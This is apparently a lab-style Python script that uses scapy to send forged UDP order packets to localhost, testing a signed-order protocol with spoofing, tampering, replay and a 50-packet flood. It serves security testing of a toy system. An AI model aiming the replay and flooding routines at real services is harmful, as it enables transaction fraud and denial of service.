import time
from scapy.all import send, IP, UDP

from order_packet import (
    OrderPacket,
    build_signable_data,
    load_private_key,
    load_public_key,
    create_signed_order,
)
from crypto_utils import verify_signature


def attack_spoofing(private_key):
    """Attack 1: Change customer_id after signing (identity spoofing)."""
    print("\n[ATTACK 1] Spoofing - changing customer_id after signing")
    order = create_signed_order(customer_id=1, order_id=2001, item_id=10, quantity=1, private_key=private_key)

    # Attacker tampers with customer_id AFTER the packet was signed
    order.customer_id = 999

    send(IP(dst="127.0.0.1") / UDP(dport=9999) / order, verbose=True)
    print("Spoofed packet sent (customer_id changed from 1 to 999).")


def attack_tampering(private_key):
    """Attack 2: Change item_id/quantity after signing (data tampering)."""
    print("\n[ATTACK 2] Tampering - changing item_id and quantity after signing")
    order = create_signed_order(customer_id=1, order_id=2002, item_id=10, quantity=1, private_key=private_key)

    # Attacker tampers with item_id and quantity AFTER the packet was signed
    order.item_id = 77
    order.quantity = 100

    send(IP(dst="127.0.0.1") / UDP(dport=9999) / order, verbose=True)
    print("Tampered packet sent (item_id 10->77, quantity 1->100).")


def attack_replay(private_key):
    """Attack 3: Resend a previously valid, unmodified signed packet."""
    print("\n[ATTACK 3] Replay - resending an old, valid signed packet")
    original_order = create_signed_order(customer_id=1, order_id=2003, item_id=10, quantity=1, private_key=private_key)

    print("Sending original packet...")
    send(IP(dst="127.0.0.1") / UDP(dport=9999) / original_order, verbose=True)

    print("Waiting 3 seconds, then resending the EXACT same packet...")
    time.sleep(3)
    send(IP(dst="127.0.0.1") / UDP(dport=9999) / original_order, verbose=True)
    print("Replayed packet sent (identical to the original, signature still valid).")


def attack_flooding(private_key, count=50):
    """Attack 4: Send many packets quickly (denial-of-service style flood)."""
    print(f"\n[ATTACK 4] Flooding - sending {count} packets rapidly")
    order = create_signed_order(customer_id=1, order_id=2004, item_id=10, quantity=1, private_key=private_key)

    for i in range(count):
        send(IP(dst="127.0.0.1") / UDP(dport=9999) / order, verbose=False)
    print(f"Flood attack complete: {count} packets sent in rapid succession.")


if __name__ == "__main__":
    private_key_a = load_private_key("customer_a")

    attack_spoofing(private_key_a)
    time.sleep(1)
    attack_tampering(private_key_a)
    time.sleep(1)
    attack_replay(private_key_a)
    time.sleep(1)
    attack_flooding(private_key_a, count=50)

    print("\nAll 4 attacks completed.")